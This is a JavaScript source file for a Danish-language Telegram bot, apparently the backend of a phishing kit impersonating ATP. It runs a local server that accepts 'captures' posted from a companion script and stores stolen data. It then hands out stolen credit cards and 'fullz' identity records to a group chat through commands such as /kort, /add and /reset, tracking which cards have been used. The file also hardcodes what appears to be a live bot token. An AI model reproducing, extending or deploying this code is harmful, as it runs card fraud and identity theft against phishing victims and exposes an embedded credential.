/**
 * bot.js — ATP Bot
 * Commands: /kort  /sidst  /antal  /slet  /add  /reset
 */

const fs   = require("fs");
const http = require("http");

const BOT_TOKEN = process.env.BOT_TOKEN || "8925456907:AAH7p4LcEC2QpqhRN1S_FTDdTiaUzhcCWow";
const GROUP_ID  = "-5587558166";
const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
const DB_FILE   = __dirname + "/captures.json";
const MAP_FILE  = __dirname + "/sent_map.json";

/* ── storage ──────────────────────────────────────────────────────── */
function loadDB()  { try { return JSON.parse(fs.readFileSync(DB_FILE,"utf8")); } catch { return []; } }
function saveDB(d) { try { fs.writeFileSync(DB_FILE, JSON.stringify(d, null, 2)); } catch(e) { console.error("[saveDB] write failed:", e.message); } }

/* ── persist sentMessages map (message_id -> capture index) ─────── */
function loadMap()  { try { return new Map(Object.entries(JSON.parse(fs.readFileSync(MAP_FILE,"utf8"))).map(([k,v])=>[Number(k),v])); } catch { return new Map(); } }
function saveMap(m) { try { fs.writeFileSync(MAP_FILE, JSON.stringify(Object.fromEntries(m))); } catch(e) { console.error("[saveMap] write failed:", e.message); } }

let captures = loadDB();
let offset   = 0;
const sentMessages = loadMap();

/* migrate old captures that don't have used field */
captures = captures.map(e => ({ ...e, used: e.used ?? false }));
saveDB(captures);

/* track which users are waiting to paste fullz */
const MAX_CAPTURES = 5000;
const awaitingAdd = new Set();

console.log(`[boot] ${captures.length} capture(s), ${sentMessages.size} tracked message(s)`);

/* ── local HTTP server (receives captures from tg.js) ─────────────── */
http.createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
    if (req.method === "POST" && req.url === "/capture") {
        let body = "";
        req.on("data", d => body += d);
        req.on("end", () => {
            try {
                const data = JSON.parse(body);
                const entry = {
                    date: new Date().toLocaleString("da-DK"),
                    text: data.text || JSON.stringify(data),
                    used: false
                };
                captures.push(entry);
                if (captures.length > MAX_CAPTURES) captures = captures.slice(-MAX_CAPTURES);
                saveDB(captures);
                console.log(`[+] Capture #${captures.length} saved`);
                res.writeHead(200); res.end("ok");
            } catch(e) {
                res.writeHead(400); res.end("bad json");
            }
        });
    } else {
        res.writeHead(404); res.end();
    }
}).listen(3001, () => console.log("[http] Local server on port 3001"));

/* ── telegram API ─────────────────────────────────────────────────── */
async function api(method, body = {}) {
    const r = await fetch(`${API}/${method}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
    });
    return r.json();
}

function send(text) {
    return api("sendMessage", { chat_id: GROUP_ID, text });
}

/* ── helpers ──────────────────────────────────────────────────────── */
const hasCC = t => /Kort Nummer: (?!—)/.test(t);

function randomItem(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

/* ── telegram poll ────────────────────────────────────────────────── */
async function poll() {
    try {
        const res = await api("getUpdates", { offset, timeout: 30, allowed_updates: ["message", "message_reaction"] });
        if (!res.ok) {
            console.error("[poll] API returned ok=false, retrying in 3s…");
            await new Promise(r => setTimeout(r, 3000));
        } else {

        for (const u of res.result || []) {
            offset = u.update_id + 1;

            /* ── handle emoji reactions (re-enable CC) ── */
            if (u.message_reaction) {
                const reaction = u.message_reaction;
                if (String(reaction.chat.id) === String(GROUP_ID)) {
                    const msgId = reaction.message_id;
                    if (sentMessages.has(msgId)) {
                        const idx = sentMessages.get(msgId);
                        if (captures[idx]) {
                            captures[idx].used = false;
                            saveDB(captures);
                            await send("CC genaktiveret — den vil dukke op i /kort igen.");
                        }
                    }
                }
                continue;
            }

            const msg = u.message;
            if (!msg || !msg.text) continue;
            if (String(msg.chat.id) !== String(GROUP_ID)) continue;

            const text    = msg.text.trim();
            const userId  = String(msg.from.id);

            /* ── /add — prompt user to paste fullz ── */
            if (text === "/add") {
                awaitingAdd.add(userId);
                await send("Send fullz nu\n\nPaste din fullz i naeste besked — den gemmes direkte i databasen.");
                continue;
            }

            /* ── handle incoming fullz paste ── */
            if (awaitingAdd.has(userId) && !text.startsWith("/")) {
                awaitingAdd.delete(userId);
                const entry = {
                    date: new Date().toLocaleString("da-DK"),
                    text: text,
                    used: false
                };
                captures.push(entry);
                if (captures.length > MAX_CAPTURES) captures = captures.slice(-MAX_CAPTURES);
                saveDB(captures);
                const ccCount = captures.filter(e => hasCC(e.text)).length;
                await send(`Fullz gemt! Database: ${captures.length} total / ${ccCount} med CC.`);
                continue;
            }

            /* ── /kort — one random UNSEEN CC ── */
            if (text === "/kort") {
                const available = captures.map((e, i) => ({ e, i })).filter(({ e }) => hasCC(e.text) && !e.used);
                if (!available.length) {
                    const total = captures.filter(e => hasCC(e.text)).length;
                    await send(`Alle ${total} CC captures er allerede sendt.\n\nBrug /reset for at nulstille, eller reager pa en CC besked for at genbruge den.`);
                    continue;
                }
                const pick = randomItem(available);
                const left = available.length - 1;
                captures[pick.i].used = true;
                saveDB(captures);
                const sent = await api("sendMessage", {
                    chat_id: GROUP_ID,
                    text: `CC [${pick.e.date}]\n\n${pick.e.text}\n\n${left} CC tilbage — reager for at genbruge`
                });
                if (sent.ok && sent.result) {
                    sentMessages.set(sent.result.message_id, pick.i);
                    saveMap(sentMessages);
                }
                continue;
            }

            /* ── /sidst — latest capture ── */
            if (text === "/sidst") {
                const e = captures[captures.length - 1];
                if (!e) { await send("No captures yet."); }
                else await send(`Seneste [${e.date}]:\n\n${e.text}`);
                continue;
            }

            /* ── /antal — counts with used/available breakdown ── */
            if (text === "/antal") {
                const ccAll   = captures.filter(e => hasCC(e.text));
                const ccUsed  = ccAll.filter(e => e.used).length;
                const ccAvail = ccAll.length - ccUsed;
                await send(
                    `Captures i alt: ${captures.length}\n` +
                    `CC total: ${ccAll.length}\n` +
                    `CC sendt: ${ccUsed}\n` +
                    `CC klar: ${ccAvail}\n` +
                    `Uden CC: ${captures.length - ccAll.length}`
                );
                continue;
            }

            /* ── /count — how many CCs available for /kort ── */
            if (text === "/count") {
                const available = captures.filter(e => hasCC(e.text) && !e.used).length;
                const total = captures.filter(e => hasCC(e.text)).length;
                await send(`${available} / ${total} CC klar til /kort`);
                continue;
            }

            /* ── /slet — clear all ── */
            if (text === "/slet") {
                captures = [];
                saveDB(captures);
                sentMessages.clear();
                saveMap(sentMessages);
                await send("Alle captures slettet.");
                continue;
            }

            /* ── /reset — mark all CCs as unseen again ── */
            if (text === "/reset") {
                const before = captures.filter(e => e.used).length;
                captures = captures.map(e => ({ ...e, used: false }));
                saveDB(captures);
                sentMessages.clear();
                saveMap(sentMessages);
                const ccCount = captures.filter(e => hasCC(e.text)).length;
                await send(`Reset! ${before} CC(s) genaktiveret.\n${ccCount} CC klar til /kort`);
                continue;
            }
        }
        } /* end else res.ok */
    } catch(e) {
        console.error("Poll error:", e.message);
        await new Promise(r => setTimeout(r, 3000));
    }
    setImmediate(poll);
}

console.log("[bot] Running — /kort  /sidst  /antal  /count  /slet  /add  /reset");
poll();
